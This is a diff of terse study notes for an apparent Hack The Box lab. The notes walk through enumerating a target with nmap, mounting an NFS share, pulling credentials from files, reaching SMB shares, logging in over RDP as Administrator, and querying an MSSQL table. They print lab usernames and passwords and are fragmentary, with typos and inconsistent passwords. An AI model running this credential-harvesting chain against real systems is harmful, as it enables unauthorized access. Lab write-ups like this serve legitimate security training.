@@ -1315,4 +1315,20 @@ Our customer agreed to this and added this server to our scope. Here, too, the g
 the same. We need to find out as much information as possible about this server and find ways to use it against the server itself.
  For the proof and protection of customer data, a user named HTB has been created. Accordingly, we need to obtain the credentials of this user as proof.
 
- $nmap -A <ip>10.129.202.41
+ $nmap -A <ip>10.129.66.14
+ -> aware NFS ports 111 and 2049 -> $ showmount -e <ip> ->share exist /te,...
+ sudo mkdir NFS && sudo mount -t nfs <ip>:/Tec,... ./NFS
+ $sudo ls -lA NFS/ -> $sudo cat NFS/ticket.txt (which not empty) -> get credential alex:lol123!mD
+-> use Credentials to list the shares as user $smbclient -L //<ip> -U alex ->found devshare
+$smbclient //<ip>/devshare -U alex  -> get wwindow credential 
+$awk 1 important.txt -> check with misconfig RDP (sa:87N1ns@slls83smb) sa:87N1ns@slls83smb: 
+$xfreerdp /v:<ip> /u:Administrator /p:'<password>' /dynamic-resolution
+xfreerdp /v:10.129.202.41 /u:Administrator /p:'87N1ns@slls83' /dynamic-resolution
+->open Microsoft SQL server management studio 18: SELECT * FROM devsacc WHERE name ='HTB'
+
+<final test>
+The third server is an MX and management server for the internal network. Subsequently, 
+this server has the function of a backup server for the internal accounts in the domain.
+ Accordingly, a user named HTB was also created here, whose credentials we need to access.
+ $nmap -A <ip>10.129.37.141
+ 
